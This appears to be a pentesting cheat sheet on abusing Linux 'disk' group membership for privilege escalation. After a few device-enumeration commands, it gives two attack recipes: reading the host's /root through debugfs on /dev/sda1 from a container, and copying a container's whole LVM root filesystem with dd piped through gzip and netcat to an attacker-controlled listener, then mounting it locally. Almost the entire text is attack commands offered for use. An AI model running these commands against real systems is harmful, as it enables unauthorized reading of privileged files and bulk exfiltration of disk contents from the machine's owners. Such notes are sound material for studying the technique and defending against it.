---
title: "disk group"
date: 2024-7-2
tags: ["Privilege Escalation", "Data Exfiltration", "File System Mounting", "Disk", "Backup", "Privilege Read", "Container", "LVM"]
---

### Basic

```console
# Show devices
lsblk
```

```console
# Device attributes
blkid
```

```console
# Show swap on blk
swapon -s
```

```console
# Filesystem info
cat /etc/fstab
```

---

### Abuse #1: Read host's filesystem from container (root)

#### 1. Open target device

```console
debugfs /dev/sda1
```

```console
# Read
ls /root
```

---

### Abuse #2: Read container's filesystem from host

#### 1. Show LVM mappings

```console
ls -l /dev/mapper/
```

#### 2. Exfil container's filesystem

```console
# In our local machine
nc -lvnp <LOCAL_PORT> > dm-0.gz
```

```console
# Target container rootfs, e.g. dm-0
dd if=/dev/dm-0 | gzip -1 - | nc <LOCAL_IP> <LOCAL_PORT>
```

#### 3. Mount locally

```console
# Extract dm-0
gunzip dm-0.gz
```

```console
# Mount the filesystem
sudo mount dm-0-orig /mnt/ 
```

```console
# Read
ls /mnt/root/
```

<small>*Note: can take a long time to transfer*</small>
